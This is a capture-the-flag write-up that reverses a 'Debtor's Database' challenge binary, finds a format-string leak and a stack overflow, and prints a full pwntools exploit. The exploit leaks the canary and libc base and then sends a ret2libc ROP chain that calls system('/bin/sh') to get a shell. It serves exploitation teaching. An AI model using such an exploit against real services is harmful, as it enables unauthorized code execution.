---
layout: post
title: QNQSEC Debtor's Database Writeup
description:
date: 2025-10-20
categories:
  - writeup
  - pwn
tags:
  - stack-canary
  - stack-overflow
---

## About The binary

![about binary](/assets/images/writeups/qnqsec/about_file.png)

The binary is dynamically linked, and has all security mitigations turned on.
## Reversing
### main 

```c
int main() {
	void* fsbase
	int64_t canary = *(fsbase + 0x28)
	setup()
	puts("What is your name (9 chars or le…")
	void name
	fgets(&name, 0xa, stdin)
	printf("Hello, ")
	printf(&name)  // <-- format string
	putchar(0xa)
	fflush(stdin)
	menu()
	noreturn
}
```

`main()` prompts user for a name the prints it using `printf(name)`, which introduces a format string vulnerability. After that it calls `menu()`

### menu 

```c
int main() {
	void* fsbase;
	int64_t var_10 = *(fsbase + 0x28);

	while (true);
	    putchar(0xa);
	    puts("Debtors' Database v2.1");
	    puts("What do you want to do today?\n");
	    puts("1. Show namelist");
	    puts("2. Input name");
	    puts("3. Delete name");
	    puts("4. Admin menu");
	    printf(&data_402263);
	    void input;
	    fgets(&input, 4, stdin);
	    fflush(stdin);
	    putchar(0xa);
	    int32_t choice = atoi(&input);
	
	    if (choice == 4)
	        break;
	
	    if (choice == 3)
	        remove_name();
	        continue;
	    else if (choice == 1)
	        show_namelist();
	        continue;
	    else if (choice == 2)
	        input_name();
	        continue;

	    puts("Invalid input!");
	    puts("Press ENTER to go back...");
	    getchar();
	enter_password();
	exit(status: 0);
	noreturn;

```

Simple menu lop that calls other functions. 
### show_namelist

```c
void show_namelist() {
	puts("[Index]        | [Amt]       | […")

	for (int32_t i = 0; i s<= 0x13; i += 1)
	    if (*((sx.q(i) << 3) + &namelist) == 0)
	        printf("Index #%d  | EMPTY\n", zx.q(i))
	    else
	        printf("Index #%d  | $%d  | %s\n", zx.q(i), 
	            zx.q(*(*((sx.q(i) << 3) + &namelist) + 0x80)), 
	            *((sx.q(i) << 3) + &namelist))

	puts("Press ENTER to return.")
	return getchar()
}
```

This function is not really interesting. It shows 20 slots (0 - 19), and if the slot is empty it prints `EMPTY`, otherwise it prints  `Index #i | $amount | name`  
### input_name

```c
int64 input_name() {
	void* fsbase
	int64_t rax = *(fsbase + 0x28)
	puts("Adding a new entry.")
	puts("Which index do you want to input…")
	char buf[0x80]
	fgets(&buf, 4, stdin)
	int32_t index = atoi(&buf)
	fflush(stdin)

	if (index s> 0x13 || index s< 0)
	    puts("Invalid index!")
	    puts("Press ENTER to go back...")
	    getchar()
	else
	    puts("Enter debtor's name:")
	    fgets(&buf, 0x80, stdin)
	    buf[strcspn(&buf, &data_4020ef, &data_4020ef)] = 0
	    void debtors_name
	    // check for buffer overflow
	    strcpy(&debtors_name, &buf, &buf)
	    fflush(stdin)
	    puts("Enter the amount owed:")
	    fgets(&buf, 0xa, stdin)
	    int32_t amount_owed = atoi(&buf)
	    fflush(stdin)
	    *((sx.q(index) << 3) + &namelist) = malloc(0x84)
	    *(*((sx.q(index) << 3) + &namelist) + 0x80) = amount_owed
	    int64_t name = *((sx.q(index) << 3) + &namelist)
	    strcpy(name, &debtors_name, name)
	    puts("Name inputted.")
	    printf("%s owes %d, added to slot #%d.\n", *((sx.q(index) << 3) + &namelist), 
	        zx.q(*(*((sx.q(index) << 3) + &namelist) + 0x80)), zx.q(index))
	    puts("Press ENTER to return.")
	    getchar()

	if (rax == *(fsbase + 0x28))
	    return rax - *(fsbase + 0x28)

	__stack_chk_fail()
	noreturn
}
```

This function implements a `add entry` operation. It reads an index from stdin (validates 0 - 19), then it prompts for debtor name and amount. The name is copied to a heap slot (`0x84 bytes`) and pointer is stored in the `namelist` array.
### remove_name

```c
int64_t remove_name() {
	void* fsbase;
	int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
	puts("Which name would you like to rem…");
	void buf;
	fgets(&buf, 4, stdin);
	fflush(stdin);
	int32_t index = atoi(&buf);

	if (index < 0 || index > 0x13)
	{
	    puts("Invalid index!");
	    puts("Press ENTER to go back...");
	    getchar();
	}
	else if (!*(uint64_t*)(((int64_t)index << 3) + &namelist))
	    puts("The index is empty!");
	else
	{
	    void name;
	    strcpy(&name, *(uint64_t*)(((int64_t)index << 3) + &namelist));
	    free(*(uint64_t*)(((int64_t)index << 3) + &namelist));
	    printf("Name %s at index #%d has been re…", &name, (uint64_t)index);
	}

	if (rax == *(uint64_t*)((char*)fsbase + 0x28))
	    return rax - *(uint64_t*)((char*)fsbase + 0x28);

	__stack_chk_fail();
	/* no return */
}

```

Frees a heap slot for a give index. 
### enter_password

```c
void enter_password() {
void* fsbase;
int64_t canary = *(uint64_t*)((char*)fsbase + 0x28);
printf("\nPlease enter the password for …");
void password;  // buffer overflow
fgets(&password, 0x100, stdin);
puts("\nWrong password!");
*(uint64_t*)((char*)fsbase + 0x28);

if (canary == *(uint64_t*)((char*)fsbase + 0x28))
    return 0;

__stack_chk_fail();
}
```

This is the function that stood out to me. There is a stack buffer overflow, but the is a stack canary also.

## Exploitation

So there are two main vulnerabilities that stood out to me here:
1. Format string vulnerability in `main()`
2. Stack buffer overflow in `enter_password()`

#### Exploit Summary

- Use the format string to leak a libc pointer and the stack canary.
- Compute libc base address from the libc pointer
- in `enter_password()` determine the offset from the buffer to the stack canary.
- Build a payload

We can use the format string vulnerability from `main()` to get a the canary and get the libc base address.

Lets first get the libc base address. The first interesting offset was the third

![about binary](/assets/images/writeups/qnqsec/write.png)

The address is `0x7ffff7d14887` now lets look at it in gdb

![about binary](/assets/images/writeups/qnqsec/offset3.png)

We can see from that the third offset points to `write+23` now we can use that to get the libc base address

```python
libc.address = (leak - 23) - libc.sym.write
```

Now we just have to get the canary. I found that the canary is at the 9th offset.

![about binary](/assets/images/writeups/qnqsec/offset9.png)

Now we just have to find the offset from our buffer to the stack canary in `enter_password()`.

Put a breakpoint just before the canary is compared with `QWORD PTR fs:0x8`, then run the program and enter the bytes you got from `pattern create <num>` command in gdb.

![about binary](/assets/images/writeups/qnqsec/check_canary.png)

After the breakpoint we can get the offset from our buffer to the stack canary.

![about binary](/assets/images/writeups/qnqsec/canary.png)

offset to canary : 56.

Now we can build our payload.

```python
offset_to_canary = 56
payload = flat(
	cyclic(offset_to_canary), # padding to canary
	canary, # from leak ealier
	cyclic(8), # saved rbp
	rop.find_gadget(['ret'])[0], # ret gadget for stack alignment
	libc_rop.find_gadget(['pop rdi', 'ret'])[0], # pop rdi, ret;
	next(libc.search(b"/bin/sh")), # get address of /bin/sh
	libc.sym.system, # adress of system function
)
```

Here is the exploit

```python
def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	canary_ = "%9$p"
	write_23 = "%3$p"

	fmt = f"{write_23}|{canary_}"
	sla(b"less)?\n", fmt.encode())
	ru(b"Hello, ")
	leaks = rl().rstrip(b"\r\n")
	canary = leaks.split(b"|")[1]
	canary = int(canary, 16)
	
	print_leak("Canary", canary)
	x = leaks.split(b"|")[0]
	x = int(x, 16)
	libc.address = (x - 23) - libc.sym.write
	print_leak("libc base address", libc.address)


	libc_rop = ROP(libc)
	pop_rdi = libc_rop.find_gadget(["pop rdi", "ret"])[0]
	binsh = next(libc.search(b"/bin/sh"))
	system = libc.sym.system
	ret = libc_rop.find_gadget(['ret'])[0]

	print_leak("system", system)
	print_leak("binsh",binsh)
	print_leak("pop rdi", pop_rdi)

	offset = 56

	payload = flat(
		cyclic(offset),
		canary,
		cyclic(8),
		ret,
		pop_rdi,
		binsh, 
		system
	)

	sla(b"go back...", b'')
	sla(b">> ", b'4')
	sla(b"admin access: ", payload)
```

The result
![about binary](/assets/images/writeups/qnqsec/shell.png)

And just like that we get a shell.

[Full Exploit Code Here](https://github.com/t1b4n3/ctf-writeups/qnqsec/debtors-database/xpl.py)

